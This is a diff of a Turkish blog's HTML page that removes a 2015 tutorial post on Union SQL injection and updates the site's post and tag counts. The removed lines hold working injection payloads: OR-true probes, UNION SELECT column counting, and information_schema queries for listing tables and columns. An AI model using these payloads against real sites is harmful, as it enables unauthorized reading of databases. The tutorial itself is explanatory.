@@ -149,7 +149,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/arsiv/" rel="section"><i class="fa fa-fw fa-archive"></i>Arşiv<span class="badge">45</span></a>
+    <a href="/arsiv/" rel="section"><i class="fa fa-fw fa-archive"></i>Arşiv<span class="badge">44</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -200,90 +200,6 @@
             
 
   <div class="posts-expand">
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="tr">
-    <link itemprop="mainEntityOfPage" href="https://www.farukcan.net/Yazilim/2015/08/union-sql-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Faruk CAN">
-      <meta itemprop="description" content="Yazılım,felsefe ve strateji üzerine…">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Faruk CAN">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/Yazilim/2015/08/union-sql-injection/" class="post-title-link" itemprop="url">Union SQL injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Yayın</span>
-
-              <time title="Oluşturuldu: 12-08-2015 10:09:49" itemprop="dateCreated datePublished" datetime="2015-08-12T10:09:49+03:00">12-08-2015</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">Kategori</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/kategoriler/Yazilim/" itemprop="url" rel="index"><span itemprop="name">Yazılım</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>SQL injection açığı bulunan bir sitede , union komutu kullanılarak, diğer tablolardanda bilgi alma biçimidir.</p>
-<p>sunucu tarafından şöyle bir açık olduğu varsayılsın</p>
-<pre>$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";</pre>
-<p>bu durumda</p>
-<pre>' OR true #</pre>
-<p>ile sql injection olduğundan emin olunur.</p>
-<pre>' UNION SELECT * FROM diger_tablo #</pre>
-<p>ile diğer tablolara erişibilir.</p>
-<p>Fakat şöyle bir sorun çıkabilir : Tabloların kolon sayıların eşit olmaması.</p>
-<pre>' OR true UNION SELECT 1,2,3 #</pre>
-<p>Biçiminde tek tek deneyerek, mevcut tablonun kolon sayısını elde edebilirsiniz.</p>
-<h2>Not</h2>
-Eğer tablo isimlerini ve kolonlarını öğrenmek isterseniz. Aşağıdaki sorgularla aynı yöntemi deneyebilirsiniz
-<pre><code>select * from information_schema.`TABLES`</code></pre>
-<pre><code>select TABLE_NAME from information_schema.`TABLES` </code></pre>
-<pre><code>select TABLE_NAME,COLUMN_NAME from information_schema.`COLUMNS`</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      
-
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
         
   
   
@@ -655,7 +571,7 @@ Eğer tablo isimlerini ve kolonlarını öğrenmek isterseniz. Aşağıdaki sorg
       <div class="site-state-item site-state-posts">
           <a href="/arsiv/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">makale</span>
         </a>
       </div>
@@ -664,7 +580,7 @@ Eğer tablo isimlerini ve kolonlarını öğrenmek isterseniz. Aşağıdaki sorg
         <span class="site-state-item-name">kategori</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">70</span>
+        <span class="site-state-item-count">69</span>
         <span class="site-state-item-name">etiket</span>
       </div>
   </nav>
